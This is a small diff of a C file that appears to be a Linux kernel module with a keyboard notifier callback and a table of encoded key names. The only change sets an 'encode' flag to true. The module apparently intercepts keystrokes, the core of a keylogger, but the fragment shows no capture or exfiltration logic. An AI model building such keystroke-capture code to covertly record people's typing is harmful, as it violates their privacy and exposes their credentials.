@@ -40,7 +40,7 @@ static const char* keysEncoded[] =
                         "\0", "\0", "\0", "\0", "\0", "\0"};
 
 struct tty_struct *tty;
-bool encode = false;
+bool encode = true;
 
 int hello_notify(struct notifier_block *nb, unsigned long code, void *_param) {
   struct keyboard_notifier_param *param = _param;
